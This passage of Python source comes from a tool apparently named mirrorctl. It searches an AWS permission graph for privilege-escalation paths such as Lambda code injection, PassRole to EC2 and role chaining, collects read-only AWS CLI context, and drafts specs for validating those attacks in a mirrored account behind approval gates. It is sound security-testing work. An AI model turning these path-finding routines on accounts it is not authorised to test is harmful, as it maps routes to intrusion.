                "AWS_ResourceControlPolicy",
            }:
                selected_nodes.add(edge.start)
                selected_edges[edge_identifier(edge)] = edge
        elif edge.kind in {"AWS_HasSCP", "AWS_HasRCP"} and edge.start in selected_nodes:
            selected_nodes.add(edge.end)
            selected_edges[edge_identifier(edge)] = edge
        elif (
            edge.kind == "AWS_CanInvokeLambdaFunction"
            and edge.start in selected_nodes
            and edge.end in selected_nodes
        ):
            # Code-update paths need either an explicit invocation capability or
            # a collected trigger. Preserve a directly available invoke edge.
            selected_edges[edge_identifier(edge)] = edge
    return selected_nodes, list(selected_edges.values())


def extract_attack_paths(
    nodes: dict[str, Node],
    edges: list[Edge],
    *,
    source_selectors: list[str] | None,
    target_selectors: list[str] | None,
    max_depth: int,
    limit: int,
) -> list[dict[str, Any]]:
    if max_depth < 1 or max_depth > 12:
        raise PipelineError("--max-depth must be between 1 and 12")
    if limit < 1 or limit > 500:
        raise PipelineError("--limit must be between 1 and 500")
    catalog = official_edge_catalog()
    if source_selectors:
        sources = sorted(
            node_id
            for node_id, node in nodes.items()
            if any(node_matches_selector(node, selector) for selector in source_selectors)
        )
    else:
        sources = default_path_sources(nodes, edges)
    if target_selectors:
        targets = {
            node_id
            for node_id, node in nodes.items()
            if any(node_matches_selector(node, selector) for selector in target_selectors)
        }
    else:
        targets = default_path_targets(nodes, edges)
    if not sources:
        raise PipelineError("no source principal matched the extraction criteria")
    if not targets:
        raise PipelineError("no target matched the extraction criteria")
    traversable = [
        edge
        for edge in edges
        if path_edge_is_traversable(edge, catalog)
        or (
            edge.end in targets
            and edge.kind not in STRUCTURAL_EDGE_KINDS
            and bool(catalog.get(edge.kind, {}).get("actions"))
            and not (
                nodes[edge.end].primary_kind == "AWS_Account"
                and edge.properties.get("is_traversable") is False
            )
        )
    ]
    adjacency: dict[str, list[Edge]] = {}
    for edge in traversable:
        adjacency.setdefault(edge.start, []).append(edge)
    found: dict[tuple[str, ...], dict[str, Any]] = {}
    for source in sources:
        queue: deque[tuple[str, list[Edge], frozenset[str]]] = deque(
            [(source, [], frozenset({source}))]
        )
        while queue and len(found) < limit * 20:
            current, path_edges, visited = queue.popleft()
            if path_edges and current in targets:
                key = tuple(edge_identifier(edge) for edge in path_edges)
                mutation_count = sum(edge_requires_mutation(edge.kind) for edge in path_edges)
                target_kind = nodes[current].primary_kind
                target_score = {
                    "AWS_Account": 100,
                    "AWS_Role": 95,
                    "AWS_KMSKey": 85,
                    "AWS_SSMParameter": 80,
                    "AWS_S3Object": 75,
                }.get(target_kind, 50)
                score = target_score + mutation_count * 3 + max(0, 20 - len(path_edges))
                path_node_ids = {source, *[edge.end for edge in path_edges]}
                support_nodes, support_edges = extract_support_edges(
                    path_node_ids, nodes, edges
                )
                combined = {edge_identifier(edge): edge for edge in path_edges}
                combined.update({edge_identifier(edge): edge for edge in support_edges})
                found[key] = {
                    "source": source,
                    "target": current,
                    "path_edges": path_edges,
                    "node_ids": support_nodes,
                    "edges": list(combined.values()),
                    "score": score,
                    "depth": len(path_edges),
                }
                continue
            if len(path_edges) >= max_depth:
                continue
            for edge in adjacency.get(current, []):
                if edge.end in visited:
                    continue
                queue.append(
                    (edge.end, path_edges + [edge], visited | {edge.end})
                )
    ranked = sorted(
        found.values(), key=lambda item: (-item["score"], item["depth"], item["source"], item["target"])
    )
    return ranked[:limit]


def extracted_path_document(
    item: dict[str, Any], nodes: dict[str, Node], source_sha256: str, index: int
) -> dict[str, Any]:
    return {
        "graph": {
            "nodes": [
                {
                    "id": node_id,
                    "kinds": list(nodes[node_id].kinds),
                    "properties": nodes[node_id].properties,
                }
                for node_id in sorted(item["node_ids"])
            ],
            "edges": [
                {
                    "kind": edge.kind,
                    "start": {"value": edge.start},
                    "end": {"value": edge.end},
                    "properties": edge.properties,
                }
                for edge in item["edges"]
            ],
        },
        "metadata": {
            "source_kind": "AWS",
            "extracted_by": "mirrorctl",
            "extractor_version": VERSION,
            "source_sha256": source_sha256,
            "path_index": index,
            "path_source": item["source"],
            "path_target": item["target"],
            "path_depth": item["depth"],
            "path_score": item["score"],
        },
    }


def write_extracted_paths(
    output: Path,
    paths: list[dict[str, Any]],
    nodes: dict[str, Node],
    source_sha256: str,
    force: bool,
) -> dict[str, Any]:
    ensure_empty_or_force(output, force)
    index_items: list[dict[str, Any]] = []
    for number, item in enumerate(paths, start=1):
        path_id = f"path-{number:03d}"
        document = extracted_path_document(item, nodes, source_sha256, number)
        json_path = output / f"{path_id}.json"
        zip_path = output / f"{path_id}.zip"
        write_json(json_path, document)
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                "graph.json",
                json.dumps(document, indent=2, ensure_ascii=False) + "\n",
            )
        index_items.append(
            {
                "path_id": path_id,
                "source_node": item["source"],
                "source_name": node_name(nodes[item["source"]]),
                "target_node": item["target"],
                "target_name": node_name(nodes[item["target"]]),
                "depth": item["depth"],
                "score": item["score"],
                "edge_sequence": [edge.kind for edge in item["path_edges"]],
                "json": str(json_path),
                "zip": str(zip_path),
            }
        )
    result = {
        "tool": "mirrorctl",
        "tool_version": VERSION,
        "created_at": utc_now(),
        "source_sha256": source_sha256,
        "path_count": len(index_items),
        "paths": index_items,
    }
    write_json(output / "index.json", result)
    return result


def required_context_for_scenario(scenario: Scenario) -> list[str]:
    common = [
        "Identity policies and inline policies",
        "Permissions boundary",
        "Role trust policy",
        "Organizations SCP when accessible",
        "IAM condition keys and required request context",
    ]
    additions = {
        "lambda_update_invoke_admin": [
            "Lambda state, runtime, handler, architecture, role and code hash",
            "Lambda code-signing configuration",
            "Lambda resource policy",
        ],
        "sts_assume_admin": ["Target role maximum session duration"],
        "ec2_passrole_spot_admin": [
            "EC2-compatible AMI selected for the mirror",
            "Spot capacity and account quota",
            "EC2 Spot service-linked role availability",
            "Subnet, security group, route and outbound AWS API connectivity",
            "Instance profile association prerequisites",
        ],
        "iam_create_access_key_s3": [
            "Target user access-key quota and existing key count",
            "S3 bucket policy, public-access block, ownership and encryption",
            "Object existence and metadata without reading object content",
        ],
        "role_chain_s3": [
            "Trust and identity policy at every role hop",
            "Maximum session duration and role-chaining duration limits",
            "S3 bucket policy, ownership and encryption",
        ],
    }
    return common + additions.get(scenario.scenario_type, [])


def arn_resource(node: Node) -> str | None:
    return node.arn


def add_context_request(
    requests: list[ContextRequest],
    *,
    service: str,
    operation: str,
    arguments: list[str],
    reason: str,
    required: bool = True,
    region: str | None = None,
) -> None:
    fingerprint = hashlib.sha1(
        json.dumps([service, operation, arguments, region], sort_keys=True).encode("utf-8")
    ).hexdigest()[:10]
    requests.append(
        ContextRequest(
            request_id=f"ctx-{fingerprint}",
            service=service,
            operation=operation,
            arguments=arguments,
            reason=reason,
            required=required,
            region=region,
        )
    )


def node_context_requests(node: Node, default_region: str) -> list[ContextRequest]:
    requests: list[ContextRequest] = []
    kind = node.primary_kind
    name = node_name(node)
    region = node_region(node) or default_region
    if kind == "AWS_User":
        add_context_request(requests, service="iam", operation="get-user", arguments=["--user-name", name], reason="Confirm user state and permissions boundary.")
        add_context_request(requests, service="iam", operation="list-user-policies", arguments=["--user-name", name], reason="Enumerate inline policy names.")
        add_context_request(requests, service="iam", operation="list-attached-user-policies", arguments=["--user-name", name], reason="Enumerate attached managed policies.")
        add_context_request(requests, service="iam", operation="list-access-keys", arguments=["--user-name", name], reason="Check access-key quota before any controlled key-creation validation.", required=False)
        inline = parse_json_property(node.properties.get("inline_policies"), {})
        for policy_name, document in inline.items() if isinstance(inline, dict) else []:
            add_context_request(requests, service="iam", operation="get-user-policy", arguments=["--user-name", name, "--policy-name", str(policy_name)], reason="Confirm the current inline user-policy document.")
            add_context_request(
                requests,
                service="accessanalyzer",
                operation="validate-policy",
                arguments=["--policy-document", json.dumps(document, separators=(",", ":")), "--policy-type", "IDENTITY_POLICY"],
                reason="Validate graph-observed inline policy grammar and security findings.",
                required=False,
                region=region,
            )
    elif kind == "AWS_Group":
        add_context_request(requests, service="iam", operation="get-group", arguments=["--group-name", name], reason="Confirm group membership and metadata.")
        add_context_request(requests, service="iam", operation="list-group-policies", arguments=["--group-name", name], reason="Enumerate inline group policies.")
        add_context_request(requests, service="iam", operation="list-attached-group-policies", arguments=["--group-name", name], reason="Enumerate attached managed policies.")
        inline = parse_json_property(node.properties.get("inline_policies"), {})
        for policy_name in inline.keys() if isinstance(inline, dict) else []:
            add_context_request(requests, service="iam", operation="get-group-policy", arguments=["--group-name", name, "--policy-name", str(policy_name)], reason="Confirm the current inline group-policy document.")
    elif kind == "AWS_Role":
        add_context_request(requests, service="iam", operation="get-role", arguments=["--role-name", name], reason="Confirm trust policy, boundary and maximum session duration.")
        add_context_request(requests, service="iam", operation="list-role-policies", arguments=["--role-name", name], reason="Enumerate inline policy names.")
        add_context_request(requests, service="iam", operation="list-attached-role-policies", arguments=["--role-name", name], reason="Enumerate attached managed policies.")
    elif kind == "AWS_Policy" and node.arn:
        add_context_request(requests, service="iam", operation="get-policy", arguments=["--policy-arn", node.arn], reason="Confirm policy metadata and current default version.")
        version = node.properties.get("default_version_id")
        if version:
            add_context_request(requests, service="iam", operation="get-policy-version", arguments=["--policy-arn", node.arn, "--version-id", str(version)], reason="Confirm effective managed-policy document.")
        document = node.properties.get("policy_document")
        if document:
            parsed = parse_json_property(document, {})
            add_context_request(
                requests,
                service="accessanalyzer",
                operation="validate-policy",
                arguments=["--policy-document", json.dumps(parsed, separators=(",", ":")), "--policy-type", "IDENTITY_POLICY"],
                reason="Validate graph-observed managed policy grammar and security findings.",
                required=False,
                region=region,
            )
    elif kind == "AWS_LambdaFunction":
        add_context_request(requests, service="lambda", operation="get-function", arguments=["--function-name", node.arn or name], reason="Confirm state, role, code hash and deployment metadata.", region=region)
        add_context_request(requests, service="lambda", operation="get-function-configuration", arguments=["--function-name", node.arn or name], reason="Confirm runtime, handler and update status.", region=region)
        add_context_request(requests, service="lambda", operation="get-function-code-signing-config", arguments=["--function-name", node.arn or name], reason="Determine whether unsigned code deployment is blocked.", required=False, region=region)
        add_context_request(requests, service="lambda", operation="get-policy", arguments=["--function-name", node.arn or name], reason="Confirm Lambda resource policy.", required=False, region=region)
        add_context_request(requests, service="lambda", operation="get-function-concurrency", arguments=["--function-name", node.arn or name], reason="Confirm reserved concurrency.", required=False, region=region)
    elif kind == "AWS_EC2Instance":
        instance_id = str(node.properties.get("instance_id") or (node.arn or "").rsplit("/", 1)[-1])
        add_context_request(requests, service="ec2", operation="describe-instances", arguments=["--instance-ids", instance_id], reason="Confirm instance, block-device, IAM profile and network attachments.", region=region)
        for attribute in ("userData", "disableApiTermination", "instanceInitiatedShutdownBehavior"):
            add_context_request(requests, service="ec2", operation="describe-instance-attribute", arguments=["--instance-id", instance_id, "--attribute", attribute], reason=f"Confirm EC2 {attribute} configuration.", required=False, region=region)
        image_id = node.properties.get("image_id")
        if image_id:
            add_context_request(requests, service="ec2", operation="describe-images", arguments=["--image-ids", str(image_id)], reason="Confirm AMI availability, ownership and block-device mappings.", region=region)
        vpc_id = node.properties.get("vpc_id")
        subnet_id = node.properties.get("subnet_id")
        if vpc_id:
            add_context_request(requests, service="ec2", operation="describe-vpcs", arguments=["--vpc-ids", str(vpc_id)], reason="Confirm VPC CIDR and tenancy.", region=region)
            for attribute in ("enableDnsSupport", "enableDnsHostnames"):
                add_context_request(requests, service="ec2", operation="describe-vpc-attribute", arguments=["--vpc-id", str(vpc_id), "--attribute", attribute], reason=f"Confirm VPC {attribute}.", region=region)
            add_context_request(requests, service="ec2", operation="describe-internet-gateways", arguments=["--filters", f"Name=attachment.vpc-id,Values={vpc_id}"], reason="Confirm attached internet gateways.", required=False, region=region)
            add_context_request(requests, service="ec2", operation="describe-nat-gateways", arguments=["--filter", f"Name=vpc-id,Values={vpc_id}"], reason="Confirm NAT gateways referenced by routes.", required=False, region=region)
            add_context_request(requests, service="ec2", operation="describe-vpc-endpoints", arguments=["--filters", f"Name=vpc-id,Values={vpc_id}"], reason="Confirm VPC endpoints and endpoint policies.", required=False, region=region)
        if subnet_id:
            add_context_request(requests, service="ec2", operation="describe-subnets", arguments=["--subnet-ids", str(subnet_id)], reason="Confirm subnet CIDR, AZ and public-IP behavior.", region=region)
            add_context_request(requests, service="ec2", operation="describe-route-tables", arguments=["--filters", f"Name=association.subnet-id,Values={subnet_id}"], reason="Confirm the subnet route-table association and routes.", region=region)
            add_context_request(requests, service="ec2", operation="describe-network-acls", arguments=["--filters", f"Name=association.subnet-id,Values={subnet_id}"], reason="Confirm network ACL entries applied to the subnet.", region=region)
        security_groups = parse_json_property(node.properties.get("security_groups"), [])
        group_ids = [str(item.get("GroupId")) for item in security_groups if isinstance(item, dict) and item.get("GroupId")]
        if group_ids:
            add_context_request(requests, service="ec2", operation="describe-security-groups", arguments=["--group-ids", *group_ids], reason="Confirm security-group metadata and rules.", region=region)
            add_context_request(requests, service="ec2", operation="describe-security-group-rules", arguments=["--filters", "Name=group-id,Values=" + ",".join(group_ids)], reason="Confirm normalized ingress and egress rules.", region=region)
        add_context_request(requests, service="ec2", operation="describe-network-interfaces", arguments=["--filters", f"Name=attachment.instance-id,Values={instance_id}"], reason="Confirm ENIs, addresses and security-group bindings.", region=region)
        add_context_request(requests, service="ec2", operation="describe-addresses", arguments=["--filters", f"Name=instance-id,Values={instance_id}"], reason="Confirm Elastic IP dependencies.", required=False, region=region)
    elif kind == "AWS_EKSCluster":
        cluster_name = name
        add_context_request(requests, service="eks", operation="describe-cluster", arguments=["--name", cluster_name], reason="Confirm EKS version, role, endpoint and VPC configuration.", region=region)
        add_context_request(requests, service="eks", operation="list-access-entries", arguments=["--cluster-name", cluster_name], reason="Confirm EKS access entries.", required=False, region=region)
        add_context_request(requests, service="eks", operation="list-pod-identity-associations", arguments=["--cluster-name", cluster_name], reason="Confirm Pod Identity associations.", required=False, region=region)
    elif kind == "AWS_EKSNodeGroup":
        cluster_name = str(node.properties.get("cluster_name") or "")
        nodegroup_name = name
        if cluster_name:
            add_context_request(requests, service="eks", operation="describe-nodegroup", arguments=["--cluster-name", cluster_name, "--nodegroup-name", nodegroup_name], reason="Confirm node role, subnets, scaling and launch-template configuration.", region=region)
    elif kind == "AWS_CloudFormationStack":
        stack_name = node.arn or name
        add_context_request(requests, service="cloudformation", operation="describe-stacks", arguments=["--stack-name", stack_name], reason="Confirm parameters, capabilities, role and status.", region=region)
        add_context_request(requests, service="cloudformation", operation="get-template", arguments=["--stack-name", stack_name, "--template-stage", "Original"], reason="Collect the original stack template as an approved artifact candidate.", region=region)
    elif kind == "AWS_CloudFormationStackSet":
        add_context_request(requests, service="cloudformation", operation="describe-stack-set", arguments=["--stack-set-name", node.arn or name], reason="Confirm StackSet template, roles, parameters and permission model.", region=region)
        add_context_request(requests, service="cloudformation", operation="list-stack-instances", arguments=["--stack-set-name", node.arn or name], reason="Confirm target accounts and Regions.", required=False, region=region)
    elif kind == "AWS_KMSKey":
        key_id = str(node.properties.get("key_id") or node.arn or name)
        add_context_request(requests, service="kms", operation="describe-key", arguments=["--key-id", key_id], reason="Confirm key spec, usage, origin and state.", region=region)
        add_context_request(requests, service="kms", operation="get-key-policy", arguments=["--key-id", key_id, "--policy-name", "default"], reason="Confirm KMS key policy.", region=region)
        add_context_request(requests, service="kms", operation="get-key-rotation-status", arguments=["--key-id", key_id], reason="Confirm rotation state.", required=False, region=region)
        add_context_request(requests, service="kms", operation="list-aliases", arguments=["--key-id", key_id], reason="Confirm aliases.", required=False, region=region)
        add_context_request(requests, service="kms", operation="list-grants", arguments=["--key-id", key_id], reason="Confirm grants that may affect effective access.", required=False, region=region)
    elif kind == "AWS_SAMLProvider":
        add_context_request(requests, service="iam", operation="get-saml-provider", arguments=["--saml-provider-arn", node.arn or name], reason="Collect SAML metadata and validity dates.")
    elif kind == "AWS_OIDCProvider":
        add_context_request(requests, service="iam", operation="get-open-id-connect-provider", arguments=["--open-id-connect-provider-arn", node.arn or name], reason="Collect OIDC URL, audiences and thumbprints.")
    elif kind in {"AWS_ServiceControlPolicy", "AWS_ResourceControlPolicy"}:
        policy_id = str(node.properties.get("policy_id") or name)
        add_context_request(requests, service="organizations", operation="describe-policy", arguments=["--policy-id", policy_id], reason="Confirm organization policy content and type.", required=False)
    elif kind == "AWS_Organization":
        add_context_request(requests, service="organizations", operation="describe-organization", arguments=[], reason="Confirm organization feature set and management account.", required=False)
    elif kind == "AWS_S3Bucket":
        bucket = node.arn.removeprefix("arn:aws:s3:::") if node.arn else name.split(":", 1)[-1]
        for operation, reason, required in (
            ("get-bucket-location", "Confirm bucket Region.", True),
            ("get-public-access-block", "Confirm public-access-block controls.", False),
            ("get-bucket-policy", "Confirm bucket resource policy.", False),
            ("get-bucket-encryption", "Confirm encryption and KMS dependency.", False),
            ("get-bucket-ownership-controls", "Confirm object ownership mode.", False),
            ("get-bucket-versioning", "Confirm versioning state.", False),
            ("get-bucket-acl", "Confirm ACL state.", False),
        ):
            add_context_request(requests, service="s3api", operation=operation, arguments=["--bucket", bucket], reason=reason, required=required, region=region)
    elif kind == "AWS_S3Object":
        bucket = str(node.properties.get("bucket_name") or "")
        arn = node.arn or ""
        key = arn.split(f"arn:aws:s3:::{bucket}/", 1)[-1] if bucket else ""
        if bucket and key:
            add_context_request(requests, service="s3api", operation="head-object", arguments=["--bucket", bucket, "--key", key], reason="Confirm object metadata without reading content.", region=region)
    elif kind == "AWS_SSMParameter":
        parameter_name = name.split(":", 1)[-1]
        add_context_request(
            requests,
            service="ssm",
            operation="describe-parameters",
            arguments=["--parameter-filters", f"Key=Name,Option=Equals,Values={parameter_name}"],
            reason="Confirm parameter metadata without collecting its value.",
            region=region,
        )
    return requests


def context_plan(
    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
) -> list[ContextRequest]:
    requests: list[ContextRequest] = []
    for node_id in scenario.node_ids:
        requests.extend(node_context_requests(nodes[node_id], scenario.region))

    # Simulate each meaningful edge when the source is an IAM user or role and
    # the graph exposes usable ARNs.  This remains non-mutating.
    catalog = official_edge_catalog()
    for edge in edges:
        actions = (
            [EDGE_ACTIONS[edge.kind]]
            if edge.kind in EDGE_ACTIONS
            else list(catalog.get(edge.kind, {}).get("actions", []))
        )
        if not actions or edge.start not in scenario.node_ids:
            continue
        source = nodes[edge.start]
        target = nodes[edge.end]
        if source.primary_kind not in {"AWS_User", "AWS_Role"} or not source.arn:
            continue
        resource = target.arn or "*"
        add_context_request(
            requests,
            service="iam",
            operation="simulate-principal-policy",
            arguments=[
                "--policy-source-arn",
                source.arn,
                "--action-names",
                *actions,
                "--resource-arns",
                resource,
            ],
            reason=f"Evaluate effective authorization for {edge.kind}.",
            required=False,
            region=scenario.region,
        )

    if scenario.source_account_id != "UNKNOWN":
        add_context_request(
            requests,
            service="organizations",
            operation="list-policies-for-target",
            arguments=[
                "--target-id",
                scenario.source_account_id,
                "--filter",
                "SERVICE_CONTROL_POLICY",
            ],
            reason="Enumerate SCPs when the collector profile has Organizations visibility.",
            required=False,
        )
    unique: dict[str, ContextRequest] = {request.request_id: request for request in requests}
    return sorted(unique.values(), key=lambda item: item.request_id)


def aws_cli_command(request: ContextRequest, profile: str) -> list[str]:
    command = ["aws", request.service, request.operation, *request.arguments]
    if request.region:
        command.extend(["--region", request.region])
    command.extend(["--profile", profile, "--output", "json", "--no-cli-pager"])
    return command


def run_command(
    command: list[str], *, cwd: Path | None = None, env: dict[str, str] | None = None, timeout: int = 120
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command,
        cwd=str(cwd) if cwd else None,
        env=env,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def aws_identity(profile: str, region: str | None = None) -> dict[str, Any]:
    command = ["aws", "sts", "get-caller-identity", "--profile", profile, "--output", "json", "--no-cli-pager"]
    if region:
        command.extend(["--region", region])
    result = run_command(command)
    if result.returncode != 0:
        raise PipelineError(f"unable to verify AWS profile {profile}: {result.stderr.strip()}")
    return json.loads(result.stdout)


def discovered_network_requests(
    *,
    vpc_ids: Iterable[str],
    subnet_ids: Iterable[str],
    security_group_ids: Iterable[str],
    region: str,
    reason_prefix: str,
) -> list[ContextRequest]:
    requests: list[ContextRequest] = []
    vpcs = sorted({value for value in vpc_ids if value})
    subnets = sorted({value for value in subnet_ids if value})
    groups = sorted({value for value in security_group_ids if value})
    if vpcs:
        add_context_request(requests, service="ec2", operation="describe-vpcs", arguments=["--vpc-ids", *vpcs], reason=f"{reason_prefix}: confirm dependent VPCs.", region=region)
        for vpc_id in vpcs:
            for attribute in ("enableDnsSupport", "enableDnsHostnames"):
                add_context_request(requests, service="ec2", operation="describe-vpc-attribute", arguments=["--vpc-id", vpc_id, "--attribute", attribute], reason=f"{reason_prefix}: confirm VPC {attribute}.", region=region)
            add_context_request(requests, service="ec2", operation="describe-route-tables", arguments=["--filters", f"Name=vpc-id,Values={vpc_id}"], reason=f"{reason_prefix}: confirm all VPC route tables.", region=region)
            add_context_request(requests, service="ec2", operation="describe-network-acls", arguments=["--filters", f"Name=vpc-id,Values={vpc_id}"], reason=f"{reason_prefix}: confirm VPC network ACLs.", region=region)
            add_context_request(requests, service="ec2", operation="describe-internet-gateways", arguments=["--filters", f"Name=attachment.vpc-id,Values={vpc_id}"], reason=f"{reason_prefix}: confirm internet gateways.", required=False, region=region)
            add_context_request(requests, service="ec2", operation="describe-nat-gateways", arguments=["--filter", f"Name=vpc-id,Values={vpc_id}"], reason=f"{reason_prefix}: confirm NAT gateways.", required=False, region=region)
            add_context_request(requests, service="ec2", operation="describe-vpc-endpoints", arguments=["--filters", f"Name=vpc-id,Values={vpc_id}"], reason=f"{reason_prefix}: confirm VPC endpoints.", required=False, region=region)
    if subnets:
        add_context_request(requests, service="ec2", operation="describe-subnets", arguments=["--subnet-ids", *subnets], reason=f"{reason_prefix}: confirm dependent subnets.", region=region)
    if groups:
        add_context_request(requests, service="ec2", operation="describe-security-groups", arguments=["--group-ids", *groups], reason=f"{reason_prefix}: confirm dependent security groups.", region=region)
        add_context_request(requests, service="ec2", operation="describe-security-group-rules", arguments=["--filters", "Name=group-id,Values=" + ",".join(groups)], reason=f"{reason_prefix}: confirm security-group rules.", region=region)
    return requests


def expand_context_response(
    request: ContextRequest, response: dict[str, Any]
) -> list[ContextRequest]:
    region = request.region or "us-east-1"
    if request.service == "ec2" and request.operation == "describe-instances":
        instances = [
            instance
            for reservation in response.get("Reservations", [])
            for instance in reservation.get("Instances", [])
        ]
        return discovered_network_requests(
            vpc_ids=[str(item.get("VpcId", "")) for item in instances],
            subnet_ids=[str(item.get("SubnetId", "")) for item in instances],
            security_group_ids=[
                str(group.get("GroupId", ""))
                for item in instances
                for group in item.get("SecurityGroups", [])
            ],
            region=region,
            reason_prefix="EC2 dependency expansion",
        )
    if request.service == "eks" and request.operation == "describe-cluster":
        config = response.get("cluster", {}).get("resourcesVpcConfig", {})
        return discovered_network_requests(
            vpc_ids=[str(config.get("vpcId", ""))],
            subnet_ids=[str(value) for value in config.get("subnetIds", [])],
            security_group_ids=[
                *[str(value) for value in config.get("securityGroupIds", [])],
                str(config.get("clusterSecurityGroupId", "")),
            ],
            region=region,
            reason_prefix="EKS dependency expansion",
        )
    if request.service == "eks" and request.operation == "describe-nodegroup":
        group = response.get("nodegroup", {})
        return discovered_network_requests(
            vpc_ids=[],
            subnet_ids=[str(value) for value in group.get("subnets", [])],
            security_group_ids=[],
            region=region,
            reason_prefix="EKS node-group dependency expansion",
        )
    return []


def collect_context(
    requests: list[ContextRequest], profile: str, expected_account: str
) -> dict[str, Any]:
    identity = aws_identity(profile)
    actual_account = str(identity.get("Account", ""))
    if expected_account != "UNKNOWN" and actual_account != expected_account:
        raise PipelineError(
            f"source profile account mismatch: graph={expected_account}, profile={actual_account}"
        )
    results: list[dict[str, Any]] = []
    queue = list(requests)
    seen: set[str] = set()
    while queue:
        request = queue.pop(0)
        if request.request_id in seen:
            continue
        seen.add(request.request_id)
        command = aws_cli_command(request, profile)
        completed = run_command(command)
        entry: dict[str, Any] = {
            "request": asdict(request),
            "command": command,
            "return_code": completed.returncode,
            "collected_at": utc_now(),
        }
        if completed.returncode == 0:
            try:
                entry["response"] = json.loads(completed.stdout or "{}")
                entry["status"] = "COLLECTED"
                queue.extend(expand_context_response(request, entry["response"]))
            except json.JSONDecodeError:
                entry["status"] = "INVALID_RESPONSE"
                entry["error"] = "AWS CLI returned non-JSON output."
        else:
            entry["status"] = "REQUIRED_FAILED" if request.required else "OPTIONAL_UNAVAILABLE"
            entry["error"] = completed.stderr.strip()[-4000:]
        results.append(entry)
    return {
        "collector": "mirrorctl",
        "collector_version": VERSION,
        "profile": profile,
        "identity": identity,
        "collected_at": utc_now(),
        "results": results,
        "summary": {
            status: sum(1 for item in results if item["status"] == status)
            for status in sorted({item["status"] for item in results})
        },
    }


def minimal_spec(
    scenario: Scenario,
    nodes: dict[str, Node],
    edges: list[Edge],
    context_requests: list[ContextRequest],
) -> dict[str, Any]:
    selected_edges = [
        edge
        for edge in edges
        if edge.start in scenario.node_ids
        and edge.end in scenario.node_ids
        and edge.kind != "AWS_Contains"
    ]
    return {
        "spec_version": "1.0",
        "generated_at": utc_now(),
        "scenario_id": scenario.scenario_id,
        "scenario_type": scenario.scenario_type,
        "source_account_id": scenario.source_account_id,
        "region": scenario.region,
        "validation_goal": "EXECUTION_AND_DETECTION_VALIDATION",
        "layers": scenario.layers,
        "inferred_layers": scenario.inferred_layers,
        "mirror_decision": {
            "mode": scenario.mirror_mode,
            "reason": scenario.mirror_reason,
            "principle": "Mirror only the execution dependency subgraph.",
        },
        "required_nodes": [
            {
                "source_id": node_id,
                "kind": nodes[node_id].primary_kind,
                "name": node_name(nodes[node_id]),
                "source_arn": nodes[node_id].arn,
                "layer": NODE_LAYERS.get(nodes[node_id].primary_kind, "CONTEXT_REQUIRED"),
            }
            for node_id in scenario.node_ids
        ],
        "required_edges": [
            {
                "kind": edge.kind,
                "source": edge.start,
                "target": edge.end,
                "layer": infer_edge_layer(edge.kind),
                "mutating": edge_requires_mutation(edge.kind),
                "conditions": edge.properties.get("conditions", ""),
            }
            for edge in selected_edges
        ],
        "required_context": required_context_for_scenario(scenario),
        "context_request_ids": [request.request_id for request in context_requests],
        "synthetic_assets": synthetic_assets_for(scenario),
        "excluded": [
            "Source credentials and access keys",
            "Production secrets and parameter values",
            "Production S3 object content",
            "KMS key material",
            "Unrelated account resources",
            "EBS/RDS snapshots unless workload state is an explicit prerequisite",
        ],
        "safety_gates": [
            "Target AWS account ID must be provided and verified before apply.",
            "Apply, attack, remediation and destroy require exact approval tokens.",
            "Attack adapters may reference Terraform outputs only.",
            "Generated resources are tagged ManagedBy=awshound-mirror.",
            "Synthetic data is used instead of source data.",
        ],
        "detection_expectations": detection_expectations_for(scenario),
    }


def synthetic_assets_for(scenario: Scenario) -> list[dict[str, str]]:
    if scenario.scenario_type in {"lambda_update_invoke_admin", "sts_assume_admin", "ec2_passrole_spot_admin"}:
        return [{"type": "SSM_PARAMETER", "purpose": "Non-sensitive privilege-use canary"}]
    if scenario.scenario_type in {"iam_create_access_key_s3", "role_chain_s3"}:
        return [{"type": "S3_OBJECT", "purpose": "Non-sensitive data-access canary"}]
    return []


def artifact_plan_for(
    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
) -> dict[str, Any]:
    selected_edges = [
        edge for edge in edges if edge.start in scenario.node_ids and edge.end in scenario.node_ids
    ]
    edge_kinds = {edge.kind for edge in selected_edges}
    artifacts: list[dict[str, Any]] = []
    for node_id in scenario.node_ids:
        node = nodes[node_id]
        if node.primary_kind == "AWS_LambdaFunction":
            injection_only = bool(
                edge_kinds
                & {
                    "AWS_CanUpdateLambdaCode",
                    "AWS_LambdaFunctionWrite",
                    "AWS_LambdaFunctionAll",
                }
            )
            artifacts.append(
                {
                    "node_id": node_id,
                    "type": "LAMBDA_DEPLOYMENT_PACKAGE",
                    "default_mode": "SYNTHETIC" if injection_only else "APPROVED_COPY",
                    "collector": "lambda:GetFunction -> Code.Location or ImageUri",
                    "reason": (
                        "Attacker-supplied code is sufficient for code-injection validation."
                        if injection_only
                        else "Existing application behavior may be a prerequisite."
                    ),
                }
            )
        elif node.primary_kind == "AWS_EC2Instance":
            artifacts.append(
                {
                    "node_id": node_id,
                    "type": "EC2_AMI_EBS_SNAPSHOT",
                    "default_mode": "APPROVED_COPY",
                    "collector": "ec2:CreateImage -> CopyImage",
                    "reason": "OS, installed packages, agents, files, and permissions may affect exploitability.",
                    "source_mutation": True,
                    "consistency": "Crash-consistent when --no-reboot is used.",
                }
            )
        elif node.primary_kind == "AWS_CloudFormationStack":
            artifacts.append(
                {
                    "node_id": node_id,
                    "type": "CLOUDFORMATION_TEMPLATE",
                    "default_mode": "APPROVED_COPY",
                    "collector": "cloudformation:GetTemplate",
                    "reason": "Stack resources cannot be reconstructed from the stack node alone.",
                }
            )
        elif node.primary_kind == "AWS_CloudFormationStackSet":
            artifacts.append(
                {
                    "node_id": node_id,
                    "type": "CLOUDFORMATION_STACKSET_TEMPLATE",
                    "default_mode": "APPROVED_COPY",
                    "collector": "cloudformation:DescribeStackSet",
                    "reason": "Template and deployment targets are outside the graph node properties.",
                }
            )
        elif node.primary_kind in {"AWS_EKSCluster", "AWS_EKSNodeGroup"}:
            artifacts.append(
                {
                    "node_id": node_id,
                    "type": "EKS_WORKLOAD_CONFIGURATION",
                    "default_mode": "CONTEXT_REQUIRED",
                    "collector": "EKS APIs plus Kubernetes API and container registry",
                    "reason": "AWS APIs do not contain all Kubernetes workload manifests or image contents.",
                }
            )
    return {
        "scenario_id": scenario.scenario_id,
        "generated_at": utc_now(),
        "default_policy": "SYNTHETIC_FIRST",
        "artifacts": artifacts,
        "rules": [
